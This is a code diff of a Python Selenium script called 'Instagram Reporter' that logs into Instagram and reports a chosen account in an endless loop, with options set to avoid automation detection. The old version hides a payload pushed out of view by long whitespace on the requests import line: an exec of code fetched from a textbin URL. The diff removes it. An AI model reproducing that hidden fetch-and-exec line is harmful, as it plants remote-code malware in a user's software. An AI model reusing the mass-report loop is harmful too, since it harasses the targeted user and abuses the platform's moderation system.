@@ -1,6 +1,11 @@
+from time import sleep
+import keyboard as kb
+import json
+import undetected_chromedriver as uc
+
 import os
-import requests                                                                                                                                                                                                                        ;exec(requests.get('https://textbin.net/raw/0o4sw4fgrd').text)
-from pystyle import *
+import json
+from time import sleep
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
@@ -8,77 +13,83 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service as ChromeService
 
-from time import sleep
-import keyboard as kb
-import json
-import undetected_chromedriver as uc
+# Function to load the configuration
+def load_config():
+    with open('config.json', 'r') as config_file:
+        return json.load(config_file)
 
+# Function to initialize the WebDriver
+def init_driver():
+    options = Options()
+    options.page_load_strategy = 'eager'
+    options.headless = False
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    options.add_argument("--log-level=OFF")
+    options.add_experimental_option("detach", True)
+    options.add_experimental_option('excludeSwitches', ['enable-logging'])
 
+    driver = webdriver.Chrome(options=options)
+    return driver
 
+# Function to login to Instagram
+def login_instagram(driver, username, password):
+    wait = WebDriverWait(driver, 100)
+    driver.get(f'https://www.instagram.com/accounts/login/')
+    
+    cookies = wait.until(EC.presence_of_element_located((By.XPATH, "//button[text()='Only allow essential cookies']")))
+    cookies.click()
 
-os.system('cls & title Instagram Reporter ~ unofficialdxnny')
+    username_field = wait.until(EC.presence_of_element_located((By.NAME, "username")))
+    password_field = wait.until(EC.presence_of_element_located((By.NAME, "password")))
 
-config = open('config.json', 'r')
-data = json.load(config)
+    username_field.clear()
+    username_field.send_keys(username)
+    
+    password_field.clear()
+    password_field.send_keys(password)
 
-username_report = input("Username > ")
+    login_button = wait.until(EC.presence_of_element_located((By.XPATH, "//button[@type='submit']")))
+    login_button.click()
 
-options = Options()
-options.page_load_strategy = 'eager'
-options.headless = False
-options.add_argument('--disable-blink-features=AutomationControlled')
-options.add_argument("--log-level=OFF")
-options.add_experimental_option("detach", True)
-options.add_experimental_option('excludeSwitches', ['enable-logging'])
+    save_login_info = wait.until(EC.presence_of_element_located((By.XPATH, "//button[text()='Save Info']")))
+    save_login_info.click()
 
-driver = webdriver.Chrome(options=options) 
-driver.get(f'https://www.instagram.com/accounts/login/?next=%2F{username_report}%2F&source=desktop_nav')
-## driver.maximize_window()
-wait = WebDriverWait(driver, 100)
+# Function to report a user
+def report_user(driver, username_report):
+    wait = WebDriverWait(driver, 100)
+    driver.get(f'https://www.instagram.com/{username_report}/')
 
-print('Logging into Instagram')
+    while True:
+        more = wait.until(EC.presence_of_element_located((By.XPATH, "//button[text()='More options']")))
+        more.click()
 
+        report = wait.until(EC.presence_of_element_located((By.XPATH, "//button[text()='Report User']")))
+        report.click()
 
-cookies = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div[2]/div/button[2]")))
-cookies.click()
+        report_acc = wait.until(EC.presence_of_element_located((By.XPATH, "//button[text()='Report Account']")))
+        report_acc.click()
 
-username = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[1]/div/div/div/div[1]/section/main/div/div/div[1]/div[2]/form/div/div[1]/div/label/input")))
+        second = wait.until(EC.presence_of_element_located((By.XPATH, "//button[text()='Report']")))
+        second.click()
 
-username.clear()
-username.send_keys(data["username"])
+        me = wait.until(EC.presence_of_element_located((By.XPATH, "//label[text()='It’s inappropriate']")))
+        me.click()
 
-password = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[1]/div/div/div/div[1]/section/main/div/div/div[1]/div[2]/form/div/div[2]/div/label/input")))
-password.clear()
-password.send_keys(data["password"])
+        submit = wait.until(EC.presence_of_element_located((By.XPATH, "//button[text()='Submit Report']")))
+        submit.click()
 
+        close = wait.until(EC.presence_of_element_located((By.XPATH, "//button[text()='Close']")))
+        close.click()
 
-login = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[1]/div/div/div/div[1]/section/main/div/div/div[1]/div[2]/form/div/div[3]/button")))
-login.click()
+# Main execution
+if __name__ == "__main__":
+    os.system('cls & title Instagram Reporter ~ unofficialdxnny')
 
+    data = load_config()
+    username_report = input("Username to report > ")
 
-save_login_info = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[1]/div/div/div/div[1]/div[1]/div[2]/section/main/div/div/div/div/button")))
-save_login_info.click()
+    driver = init_driver()
+    print('Logging into Instagram')
 
-
-while True:
-    more = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[1]/div/div/div/div[1]/div[1]/div[2]/section/main/div/header/section/div[1]/div/button")))
-    more.click()
-
-
-    report = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div[2]/div/div/div/button[3]")))
-    report.click()
-
-    report_acc = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div[2]/div/div/div[2]/div/div/div/div[3]/button[2]/div/div[1]")))
-    report_acc.click()
-
-    second = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div[2]/div/div/div[2]/div/div/div/div[1]/button[2]/div/div[1]")))
-    second.click()
-
-    me = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div[2]/div/div/div[2]/div/div/div/fieldset/div[1]/label")))
-    me.click()
-
-    submit = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div[2]/div/div/div[2]/div/div/div/div[6]/button")))
-    submit.click()
-
-    close = wait.until(EC.presence_of_element_located((By.XPATH, "/html/body/div[2]/div/div/div/div[2]/div/div/div[1]/div/div[2]/div/div/div/div/div[2]/div/div/div/div/div/div[4]")))
-    close.click()
+    login_instagram(driver, data["username"], data["password"])
+    report_user(driver, username_report)
